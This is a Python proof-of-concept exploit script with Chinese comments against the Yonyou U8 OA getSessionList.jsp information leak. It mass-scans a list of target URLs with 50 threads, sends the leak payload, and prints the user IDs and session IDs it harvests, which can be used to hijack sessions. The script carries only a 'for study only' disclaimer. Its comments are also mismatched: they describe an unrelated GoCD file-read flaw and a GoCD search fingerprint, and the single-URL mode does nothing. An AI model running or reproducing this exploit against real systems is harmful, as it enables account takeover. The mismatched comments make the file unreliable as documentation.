# coding=utf-8
# 学习python，自己写的一些历史漏洞的poc，仅供学习参考，请勿用于非法用途，产生的法律风险由您自己负责。
# 参考链接：http://wiki.peiqi.tech/wiki/oa/%E7%94%A8%E5%8F%8BOA/%E7%94%A8%E5%8F%8B%20U8%20OA%20getSessionList.jsp%20%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E6%BC%8F%E6%BC%8F%E6%B4%9E.html
# 用友 U8 OA getSessionList.jsp 敏感信息泄漏漏洞
# #漏洞描述
# GoCD plugin aip 参数中的 pluginName 参数存在任意文件读取漏洞，导致攻击者可以获取服务器中的任意敏感信息
# #网络测绘
# title="Create a pipeline - Go"
# poc使用方法 python poc.py -u url 或 python poc.py -uf url.txt
import argparse
import time
from urllib.parse import urlparse
import requests
import urllib3
from lxml import etree
from concurrent.futures import ThreadPoolExecutor

urllib3.disable_warnings()


def cmdline(known=False):
    parser = argparse.ArgumentParser()
    parser.add_argument(
        '-u',
        '--url',
        help='-u http://test.com',
        type=str
    )
    parser.add_argument(
        '-uf',
        '--urlfile',
        help='-uf 1.txt',
        type=str
    )
    opt = parser.parse_args()

    if opt.urlfile:
        urls = open(opt.urlfile).readlines()

        with ThreadPoolExecutor(50) as t:
            for url in urls:
                t.submit(poc_func, url=url.replace("\n", ""))
    else:
        file_poc_func(opt.url)


def file_poc_func(url):
    print(url)


def save_result(str):
    with open('result.txt', 'a+') as f:
        f.write(str)
    f.close()


def poc_func(url):
    # poc的payload
    payload = "/yyoa/ext/https/getSessionList.jsp?cmd=getAll"

    # 解析url
    parsed_result = urlparse(url)
    # 拼接payload
    poc_url = f"{parsed_result.scheme}://{parsed_result.netloc}{payload}"
    # 发送payload
    try:
        result = requests.get(poc_url, verify=False, timeout=5)
        # 解析结果并返回
        if result.status_code == 200 and len(result.text) > 80:
            print(url + "存在漏洞\n" + "paylad:" + poc_url)
            save_result(url + "存在漏洞\n" + "paylad:" + poc_url)
            html = etree.HTML(result.text)
            id = html.xpath('/html/body/sessionlist/session')
            for i in id:
                print("userid:" + i.xpath('./usrid/text()')[0].replace('\r\n', '') + "\t" + "session:" +
                      i.xpath('./sessionid/text()')[0].replace('\r\n', ''))
        else:
            print("未检测出漏洞")
    except:
        print(url + "检测异常")
        return


if __name__ == '__main__':
    cmdline()
# 学习python，自己写的一些历史漏洞的poc，仅供学习参考，请勿用于非法用途，产生的法律风险由您自己负责。
